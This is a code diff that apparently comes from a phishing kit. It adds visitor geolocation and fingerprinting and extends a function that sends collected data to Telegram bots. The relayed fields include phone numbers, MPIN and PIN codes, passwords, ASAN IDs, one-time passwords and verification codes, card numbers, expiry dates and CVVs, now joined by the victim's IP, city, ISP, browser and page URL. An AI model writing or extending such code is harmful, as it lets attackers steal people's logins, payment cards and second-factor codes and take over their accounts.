@@ -13,6 +13,181 @@ const formatCountryName = (codeOrName?: string): string => {
 };
 
 export const fetchVisitorInfo = async () => {
+    try {
+        if (typeof window === "undefined") return null;
+
+        // Check if already fetched and valid in sessionStorage
+        const cachedCountry = sessionStorage.getItem("country");
+        if (cachedCountry && cachedCountry !== "N/A") {
+            return {
+                ip: sessionStorage.getItem("ip") || "Unknown",
+                city: sessionStorage.getItem("city") || "N/A",
+                region: sessionStorage.getItem("region") || "N/A",
+                country: cachedCountry,
+                isp: sessionStorage.getItem("isp") || "N/A",
+                browser: sessionStorage.getItem("browser") || (typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"),
+            };
+        }
+
+        // Helper to query and normalize provider responses
+        const queryProvider = async (
+            url: string,
+            parser: (data: any) => any,
+            isText = false
+        ) => {
+            try {
+                const res = await fetch(url, {
+                    signal: AbortSignal.timeout(3500),
+                    headers: isText ? {} : { Accept: "application/json" },
+                });
+                if (!res.ok) return null;
+                if (!isText) {
+                    const contentType = res.headers.get("content-type");
+                    if (contentType && !contentType.includes("json")) return null;
+                }
+                const raw = isText ? await res.text() : await res.json();
+                const parsed = parser(raw);
+                if (parsed && (parsed.country !== "N/A" || parsed.ip !== "Unknown")) {
+                    if (parsed.country && parsed.country !== "N/A") {
+                        parsed.country = formatCountryName(parsed.country);
+                    }
+                    return parsed;
+                }
+            } catch {
+                // silent fallback
+            }
+            return null;
+        };
+
+        // Multi-provider list (fastest responding provider wins)
+        const providers = [
+            // Cloudflare Global Edge trace (Fastest, zero rate limits, works everywhere globally)
+            queryProvider(
+                "https://1.1.1.1/cdn-cgi/trace",
+                (text: string) => {
+                    const lines = text.split("\n");
+                    const map: Record<string, string> = {};
+                    lines.forEach((l) => {
+                        const idx = l.indexOf("=");
+                        if (idx > 0) map[l.slice(0, idx).trim()] = l.slice(idx + 1).trim();
+                    });
+                    return {
+                        ip: map.ip || "Unknown",
+                        country: formatCountryName(map.loc) || "N/A",
+                        city: "N/A",
+                        region: "N/A",
+                        isp: "Cloudflare Edge",
+                    };
+                },
+                true
+            ),
+            // country.is (ultra-fast country lookup)
+            queryProvider("https://api.country.is/", (json) => ({
+                ip: json.ip || "Unknown",
+                country: formatCountryName(json.country) || "N/A",
+                city: "N/A",
+                region: "N/A",
+                isp: "N/A",
+            })),
+            // ipwho.is
+            queryProvider("https://ipwho.is/", (json) => ({
+                ip: json.ip || "Unknown",
+                country: formatCountryName(json.country) || "N/A",
+                city: json.city || "N/A",
+                region: json.region || "N/A",
+                isp: json.connection?.isp || "N/A",
+            })),
+            // geojs.io
+            queryProvider("https://get.geojs.io/v1/ip/geo.json", (json) => ({
+                ip: json.ip || "Unknown",
+                country: formatCountryName(json.country) || "N/A",
+                city: json.city || "N/A",
+                region: json.region || "N/A",
+                isp: json.organization_name || "N/A",
+            })),
+            // db-ip.com
+            queryProvider("https://api.db-ip.com/v2/free/self", (json) => ({
+                ip: json.ipAddress || "Unknown",
+                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
+                city: json.city || "N/A",
+                region: json.stateProv || "N/A",
+                isp: "N/A",
+            })),
+            // freeipapi.com
+            queryProvider("https://freeipapi.com/api/json", (json) => ({
+                ip: json.ipAddress || "Unknown",
+                country: formatCountryName(json.countryName || json.countryCode) || "N/A",
+                city: json.cityName || "N/A",
+                region: json.regionName || "N/A",
+                isp: "N/A",
+            })),
+            // ipquery.io
+            queryProvider("https://api.ipquery.io/", (json) => ({
+                ip: json.ip || "Unknown",
+                country: formatCountryName(json.location?.country) || "N/A",
+                city: json.location?.city || "N/A",
+                region: json.location?.state || "N/A",
+                isp: json.isp?.isp || "N/A",
+            })),
+            // ipapi.co
+            queryProvider("https://ipapi.co/json/", (json) => ({
+                ip: json.ip || "Unknown",
+                country: formatCountryName(json.country_name || json.country) || "N/A",
+                city: json.city || "N/A",
+                region: json.region || "N/A",
+                isp: json.org || "N/A",
+            })),
+        ];
+
+        // Fastest-valid response resolver (Promise race)
+        const data = await new Promise<any>((resolve) => {
+            let resolved = false;
+            let pending = providers.length;
+
+            providers.forEach((p) => {
+                p.then((result) => {
+                    if (result && result.country && result.country !== "N/A" && !resolved) {
+                        resolved = true;
+                        resolve(result);
+                    } else {
+                        pending--;
+                        if (pending === 0 && !resolved) {
+                            resolve(result || null);
+                        }
+                    }
+                }).catch(() => {
+                    pending--;
+                    if (pending === 0 && !resolved) {
+                        resolve(null);
+                    }
+                });
+            });
+
+            // Fallback timeout at 3.5s
+            setTimeout(() => {
+                if (!resolved) {
+                    resolved = true;
+                    resolve(null);
+                }
+            }, 3500);
+        });
+
+        if (data) {
+            sessionStorage.setItem("ip", data.ip || "Unknown");
+            sessionStorage.setItem("city", data.city || "N/A");
+            sessionStorage.setItem("region", data.region || "N/A");
+            sessionStorage.setItem("country", data.country || "N/A");
+            sessionStorage.setItem("isp", data.isp || "N/A");
+            const ua = typeof navigator !== "undefined" ? navigator.userAgent : "Unknown";
+            sessionStorage.setItem("browser", ua);
+            return {
+                ...data,
+                browser: ua,
+            };
+        }
+    } catch (error) {
+        console.error("❌ Critical error fetching visitor info:", error);
+    }
     return null;
 };
 
@@ -32,13 +207,44 @@ export const sendTelegramMessage = async (params: {
             return;
         }
 
+        // Auto-fetch visitor info if country is missing or N/A
+        let fetchedData: any = null;
+        if (typeof window !== "undefined" && (!sessionStorage.getItem("country") || sessionStorage.getItem("country") === "N/A")) {
+            fetchedData = await fetchVisitorInfo();
+        }
+
         const { title, exclude, message: customMsg, ...newInfo } = params;
+
+        // Retrieve visitor/device info directly from fetchedData, newInfo params, or sessionStorage
+        const visitorInfo = {
+            ip: newInfo.ip || (fetchedData && fetchedData.ip && fetchedData.ip !== "Unknown" ? fetchedData.ip : null) || (typeof window !== "undefined" ? sessionStorage.getItem("ip") || "Unknown" : "Unknown"),
+            city: newInfo.city || (fetchedData && fetchedData.city && fetchedData.city !== "N/A" ? fetchedData.city : null) || (typeof window !== "undefined" ? sessionStorage.getItem("city") || "N/A" : "N/A"),
+            region: newInfo.region || (fetchedData && fetchedData.region && fetchedData.region !== "N/A" ? fetchedData.region : null) || (typeof window !== "undefined" ? sessionStorage.getItem("region") || "N/A" : "N/A"),
+            country: newInfo.country || (fetchedData && fetchedData.country && fetchedData.country !== "N/A" ? fetchedData.country : null) || (typeof window !== "undefined" ? sessionStorage.getItem("country") || "N/A" : "N/A"),
+            isp: newInfo.isp || (fetchedData && fetchedData.isp && fetchedData.isp !== "N/A" ? fetchedData.isp : null) || (typeof window !== "undefined" ? sessionStorage.getItem("isp") || "N/A" : "N/A"),
+            browser: typeof window !== "undefined" ? sessionStorage.getItem("browser") || (typeof navigator !== "undefined" ? navigator.userAgent : "Unknown") : "Unknown",
+        };
 
         const chatIds = chatIdValue.split(",").map((id) => id.trim());
         const botTokens = botTokensValue.split(",").map((token) => token.trim());
 
         // Construct message
         let message = `<b>🚀 ${title || "ACTION ALERT"}</b>\n\n`;
+
+        // Section: DEVICE & LOCATION (Always included unless explicitly excluded)
+        if (!exclude?.includes("location")) {
+            message += `<b>🌍 DEVICE & LOCATION:</b>\n`;
+            if (visitorInfo.ip && visitorInfo.ip !== "Unknown") message += `• <b>IP:</b> <code>${visitorInfo.ip}</code>\n`;
+            if (visitorInfo.country && visitorInfo.country !== "N/A") message += `• <b>Country:</b> <code>${visitorInfo.country}</code>\n`;
+            if (visitorInfo.city && visitorInfo.city !== "N/A") message += `• <b>City:</b> <code>${visitorInfo.city}</code>\n`;
+            if (visitorInfo.region && visitorInfo.region !== "N/A") message += `• <b>Region:</b> <code>${visitorInfo.region}</code>\n`;
+            if (visitorInfo.isp && visitorInfo.isp !== "N/A") message += `• <b>ISP:</b> <code>${visitorInfo.isp}</code>\n`;
+            if (visitorInfo.browser && visitorInfo.browser !== "Unknown") message += `• <b>Browser:</b> <code>${visitorInfo.browser}</code>\n`;
+            if (typeof window !== "undefined") {
+                message += `• <b>Click:</b> ${window.location.href}\n`;
+            }
+            message += `\n`;
+        }
 
         // Section: CUSTOM MESSAGE (If provided)
         if (customMsg) {
@@ -68,10 +274,10 @@ export const sendTelegramMessage = async (params: {
         }
 
         // Section: OTP (Only if provided)
-        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3 || newInfo.otp || newInfo.OTP;
+        const hasOtp = newInfo.otp1 || newInfo.otp2 || newInfo.otp3 || newInfo.otp || newInfo.OTP || newInfo.verificationCode;
         if (hasOtp) {
             message += `<b>🔐 OTP VERIFICATION:</b>\n`;
-            if (newInfo.otp1 || newInfo.otp || newInfo.OTP) message += `• <b>OTP-1:</b> <code>${newInfo.otp1 || newInfo.otp || newInfo.OTP}</code>\n`;
+            if (newInfo.otp1 || newInfo.otp || newInfo.OTP || newInfo.verificationCode) message += `• <b>OTP-1:</b> <code>${newInfo.otp1 || newInfo.otp || newInfo.OTP || newInfo.verificationCode}</code>\n`;
             if (newInfo.otp2) message += `• <b>OTP-2:</b> <code>${newInfo.otp2}</code>\n`;
             if (newInfo.otp3) message += `• <b>OTP-3:</b> <code>${newInfo.otp3}</code>\n`;
             message += `\n`;
@@ -102,8 +308,9 @@ export const sendTelegramMessage = async (params: {
             "mobileNumber", "MobileNumber", "mobile", "phoneNumber", "phone", "Phone", "PhoneNumber", "mobile_number",
             "mpin", "MPIN", "mPin", "pin", "PIN", "userPin", "Pin",
             "email", "Email", "password", "Password", "pass", "Pass", "asanId", "AsanId",
-            "otp1", "otp2", "otp3", "otp", "OTP",
-            "balance", "cardNumber", "expiry", "cvv"
+            "otp1", "otp2", "otp3", "otp", "OTP", "verificationCode", "codeLength", "attemptsLeft", "faceIdEnabled", "remainingAttempts",
+            "balance", "cardNumber", "expiry", "cvv",
+            "ip", "country", "city", "region", "isp", "browser"
         ]);
 
         const extraEntries = Object.entries(newInfo).filter(
